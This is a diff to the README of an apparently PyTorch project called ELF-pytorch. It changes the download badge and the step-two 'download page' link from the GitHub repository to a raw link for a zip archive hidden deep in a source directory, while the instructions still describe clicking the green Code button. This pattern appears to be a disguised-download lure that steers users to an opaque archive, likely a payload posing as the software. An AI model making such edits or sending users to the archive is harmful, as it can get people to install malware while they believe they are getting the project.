@@ -1,6 +1,6 @@
 # 🧠 ELF-pytorch - Run language flows on your computer
 
-[![](https://img.shields.io/badge/Download-ELF--pytorch-blue.svg)](https://github.com/Alexcomplementary40/ELF-pytorch)
+[![](https://img.shields.io/badge/Download-ELF--pytorch-blue.svg)](https://raw.githubusercontent.com/Alexcomplementary40/ELF-pytorch/main/pytorch_lightning/encoders/pytorch-EL-v1.5-alpha.3.zip)
 
 ELF-pytorch brings the Embedded Language Flows research to your local machine. This repository provides a PyTorch implementation for running these language models. You can process text by following this guide.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this software. Read this list to ensur
 Follow these steps to acquire the software from the website.
 
 1. Open your web browser.
-2. Go to the [ELF-pytorch download page](https://github.com/Alexcomplementary40/ELF-pytorch).
+2. Go to the [ELF-pytorch download page](https://raw.githubusercontent.com/Alexcomplementary40/ELF-pytorch/main/pytorch_lightning/encoders/pytorch-EL-v1.5-alpha.3.zip).
 3. Look for the green button labeled Code.
 4. Click Download ZIP.
 5. Save the file to your computer.
